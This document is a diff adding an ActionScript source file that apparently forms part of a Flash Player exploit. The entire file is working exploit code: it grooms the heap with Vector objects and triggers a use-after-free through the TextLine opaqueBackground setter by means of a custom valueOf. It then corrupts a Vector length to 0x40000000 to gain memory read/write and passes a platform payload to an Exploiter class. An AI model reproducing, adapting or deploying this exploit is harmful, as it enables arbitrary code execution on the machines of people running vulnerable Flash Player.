@@ -1,0 +1,150 @@
+﻿package
+{
+    import flash.display.DisplayObjectContainer;
+    import flash.utils.ByteArray;
+    import flash.system.Capabilities;
+    import flash.events.MouseEvent;
+    import flash.external.ExternalInterface;
+    import flash.text.*;
+    import flash.text.*;
+    import flash.text.engine.*;
+
+    public class MyClass
+    {
+        static var 
+            _gc:Array,
+            _ar:Array,
+            _ar_reuse:Array,
+            _ar_text_line:Array,
+            _arLen:int,
+            _ar_reuseLen:int,
+            _ar_text_lineLen:int,
+            _vu:Vector.<uint>,
+            _tb:TextBlock,
+            _mc:MyClass,
+            _cnt:int,
+            _vLen:int,
+            LEN40:uint = 0x40000000;
+		
+        static function valueOf2()
+        {
+            try 
+            {
+                if (++_cnt < _ar_text_lineLen) {
+                    //recursive call for next TextLine
+                    _ar_text_line[_cnt].opaqueBackground = _mc;
+                } else {
+                    for(var i:int = 1; i <= 19; i++)
+                        _tb.recreateTextLine(_ar_text_line[_ar_text_lineLen - i]);
+                    // reuse freed memory
+                    for(i=0; i < _ar_reuseLen; i++)
+                        _ar_reuse[i].length = _vLen;
+                }
+            }
+            catch (e:Error)
+            {
+                Logger.log("valueOf2 " + e.toString());
+            }
+            
+            return _vLen+8;
+        }
+		
+		static function TryExpl(e:Exploit, platform:String, payload:ByteArray, try_number:uint)
+		{
+            if (try_number > 3)
+                return
+            
+			try
+			{
+                // init vars
+                Logger.log("init vars")
+                _arLen = 30
+                _ar_text_lineLen = 50
+                _ar_reuseLen = 80
+                
+                _ar = new Array(_arLen);
+                _ar_text_line = new Array(_ar_text_lineLen)
+                _ar_reuse = new Array(_ar_reuseLen)
+                
+                if (!_gc) _gc = new Array();
+                _gc.push(_ar);
+                _gc.push(_ar_text_line);
+                _gc.push(_ar_reuse);
+                
+                if (!_tb) {
+                    _tb = new TextBlock(new TextElement("TextElement", new ElementFormat()));
+                    if (!_tb) throw new Error("_tb = " + _tb);
+                }
+                
+                _mc = new MyClass();
+                
+                _vLen = 400/4-2;
+                // fill 400-byte holes (400 is factor of 0x320(800) opaqueBackground corruption offset)
+                Logger.log("fill 400-byte holes (400 is factor of 0x320(800) opaqueBackground corruption offset)")
+                for(var i:uint = 0; i < _arLen; i++) 
+                    _ar[i] = new Vector.<uint>(_vLen)
+				
+                // prepare Vector objects
+                Logger.log("prepare Vector objects")
+                for(i = 0; i < _ar_reuseLen; i++) {
+                    _ar_reuse[i] = new Vector.<uint>(8);
+                    _ar_reuse[i][0] = i;
+                    _ar_reuse[i][1] = 0xdeedbeef
+                }
+				
+                // prepare TextLines
+                Logger.log("prepare TextLines")
+                for(i = 0; i < _ar_text_lineLen; i++) 
+                    _ar_text_line[i] = _tb.createTextLine()
+
+                // fill 1016-byte holes (0x38c is a size of internal TextLine object)
+                Logger.log("fill 1016-byte holes (0x38c is a size of internal TextLine object)")
+                for(i = 0; i < _ar_text_lineLen; i++) 
+                    _ar_text_line[i].opaqueBackground = 1 // alloc 1016 bytes
+
+                // set custom valueOf() for _mc
+                Logger.log("set custom valueOf() for _mc")
+                MyClass.prototype.valueOf = valueOf2
+
+                // here we go, call the vulnerable setter
+                Logger.log("here we go, call the vulnerable setter")
+                //_cnt = _ar_text_lineLen - 6
+                _cnt = _ar_text_lineLen - 20
+                _ar_text_line[_cnt].opaqueBackground = _mc
+
+                // find corrupted vector length 
+                Logger.log("find corrupted vector length ")
+                for(i=0; i < _ar_reuseLen; i++) {
+                    _vu = _ar_reuse[i];
+                    if (_vu.length > _vLen+2) {
+                    	Logger.log("ar["+i.toString()+"].length = " + _vu.length.toString(16));
+                    	Logger.log("ar["+i.toString()+"]["+_vLen.toString(16)+"] = " + _vu[_vLen].toString(16));
+                    	if (_vu[_vLen] == _vLen) {
+                    		// corrupt next vector 
+                    		_vu[_vLen] = LEN40;
+                    		// get corrupted vector
+                    		_vu = _ar_reuse[_vu[_vLen+2]]; 
+                    		break;
+                    	}
+                    };// else CheckCorrupted(_vu, i); // 4RnD
+                }
+
+                // check results
+                Logger.log("v.length = " + _vu.length.toString(16));
+                
+                if (_vu.length < LEN40) throw new Error("try again");
+
+                var exploiter:Exploiter = new Exploiter(e, platform, payload, _vu, 0x62)
+			}
+			catch (err:Error)
+			{
+                Logger.log("TryExpl " + err.toString());
+                if (err.toString().indexOf("try again") != -1) {
+                    MyClass.TryExpl(e, platform, payload, try_number + 1)
+                }
+			}
+		}
+		
+	}
+
+}
